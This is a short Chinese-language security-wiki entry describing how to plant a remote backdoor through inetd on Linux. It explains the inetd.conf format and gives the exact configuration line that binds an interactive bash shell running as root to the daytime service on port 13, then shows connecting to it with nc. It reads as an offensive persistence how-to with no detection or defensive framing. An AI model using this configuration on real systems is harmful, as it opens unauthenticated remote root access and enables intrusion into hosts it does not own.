## inetd 远程后门

inetd，也叫作“超级服务器”，就是监视一些网络请求的守护进程，其根据网络请求来调用相应的服务进程来处理连接请求。inetd.conf则是inetd的配置文件。inetd.conf文件告诉inetd监听哪些网络端口，为每个端口启动哪个服务。位置是/etc/inetd.conf 配置格式：[servicename] [socktype] [proto] [flags] [user] [server_path] [args] 在配置文件下写入以下内容。daytime stream tcp nowait root /bin/bash bash -i

daytime服务（13端口） 套接字类型 协议类型 不等待 用户组 提供服务的程序 daytime stream tcp nowait root /bin/bash bash -i

![](images/security_wiki/15905819363050.png)


这样配置好了以后利用nc attip 13

![](images/security_wiki/15905819430416.png)


